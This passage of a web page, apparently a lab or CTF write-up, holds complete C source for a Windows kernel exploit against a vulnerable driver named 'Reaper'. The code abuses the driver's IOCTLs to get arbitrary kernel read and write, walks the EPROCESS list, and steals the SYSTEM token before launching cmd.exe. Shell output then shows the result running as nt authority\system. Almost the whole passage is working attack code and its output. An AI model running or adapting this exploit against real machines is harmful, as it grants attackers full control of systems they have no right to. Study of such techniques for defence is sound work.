+</span><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0x80002003
+</span><span class="o">#define</span><span class="na"> IOCTL_FREE</span><span class="mi">  0x80002007
+</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi">  0x8000200b
+
+</span><span class="o">#define</span><span class="na"> OFFSET_Token</span><span class="mi"> 0x4b8
+</span><span class="o">#define</span><span class="na"> OFFSET_UniqueProcessId</span><span class="mi"> 0X440
+</span><span class="o">#define</span><span class="na"> OFFSET_ActiveProcessLinks</span><span class="mi"> 0x448
+
+</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG
+
+</span><span class="no">typedef struct</span><span class="p"> ReaperData {
+    </span><span class="na">DWORD</span><span class="p"> Magic;
+    </span><span class="na">DWORD</span><span class="p"> ThreadId;
+    </span><span class="na">DWORD</span><span class="p"> Priority;
+    </span><span class="na">DWORD</span><span class="p"> Empty;
+    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
+    </span><span class="na">QWORD</span><span class="p"> DstAddress;
+} </span><span class="na">ReaperData</span><span class="p">;
+
+</span><span class="na">VOID </span><span class="na">Alloc</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">, ReaperData </span><span class="o">*</span><span class="ra">userData</span><span class="p">) {
+    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">ULONG</span><span class="p"> bytes;
+
+    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);  
+}
+
+</span><span class="na">VOID Free</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
+    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">ULONG</span><span class="p"> bytes;
+
+    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="no">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, output,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">bytes,</span><span class="mi"> NULL</span><span class="p">);
+}
+
+</span><span class="na">VOID Copy</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
+    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">ULONG</span><span class="p"> bytes;
+
+    ZeroMemory(output,</span><span class="o"> sizeof</span><span class="p">(output));
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="no">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);
+}
+
+</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> src</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> dest</span><span class="p">) {
+    ReaperData userData;
+
+    userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
+    userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
+    userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
+    userData.SrcAddress </span><span class="o">= </span><span class="p">src;
+    userData.DstAddress </span><span class="o">=</span><span class="p"> dest;
+
+    Alloc(hDevice, </span><span class="o">&</span><span class="p">userData);
+    Copy(hDevice);
+    Free(hDevice);
+}
+
+</span><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
+    </span><span class="na">QWORD</span><span class="p"> output;
+    ReaperData userData;
+
+    userData.Magic</span><span class="p"> = </span><span class="mi">0x6a55cc9e</span><span class="p">;
+    userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
+    userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
+    userData.SrcAddress </span><span class="o">= </span><span class="p">where;
+    userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
+
+    Alloc(hDevice,</span><span class="o"> &</span><span class="p">userData);
+    Copy(hDevice);
+    Free(hDevice);
+
+    </span><span class="o">return</span><span class="p"> output;
+}
+
+</span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
+    </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
+    </span><span class="na">HANDLE</span><span class="p"> psInitialProcess</span><span class="o"> =</span><span class="p"> GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
+
+    </span><span class="na">QWORD</span><span class="p"> psOffset</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) psInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
+    </span><span class="na">QWORD</span><span class="p"> psAddress</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> psOffset;
+
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, psAddress);
+    FreeLibrary(hKernel);
+
+    </span><span class="o">return</span><span class="p"> systemEProcess;
+}
+
+</span><span class="na">QWORD GetCurrentEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> systemEProcess</span><span class="p">) {
+    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> systemEProcess;
+    </span><span class="na">DWORD</span><span class="p"> currentProcessId</span><span class="o"> =</span><span class="p"> GetCurrentProcessId();
+
+    </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
+        </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
+        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);
+
+        currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;
+
+        </span><span class="o">if</span><span class="p"> ((</span><span class="na">DWORD</span><span class="p">) processId</span><span class="o"> ==</span><span class="p"> currentProcessId) {
+            </span><span class="o">break</span><span class="p">;
+        }
+    }
+
+    </span><span class="o">return</span><span class="p"> currentEProcess;
+}
+
+</span><span class="na">QWORD</span><span class="p"> GetKernelBase() {
+    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">DWORD</span><span class="p"> cbNeeded;
+    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
+
+    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
+}
+
+</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
+    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
+
+    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">==</span><span class="p"> INVALID_HANDLE_VALUE) {
+        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
+        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
+    }
+
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess</span><span class="o"> =</span><span class="p"> GetSystemEProcess(hDevice, GetKernelBase());
+    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> GetCurrentEProcess(hDevice, systemEProcess);
+
+    ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+</span><span class="p"> OFFSET_Token, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_Token);
+    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
+
+    CloseHandle(hDevice);
+    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Users\keysvc\Desktop> </span><span class="am">exploit.exe</span><span class="p">
+Microsoft Windows [Version 10.0.19045.3208]
+(c) Microsoft Corporation. All rights reserved.  
+
+C:\Users\keysvc\Desktop> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Users\keysvc\Desktop></span>
 </code></pre></div></div><br>
 
 </section>
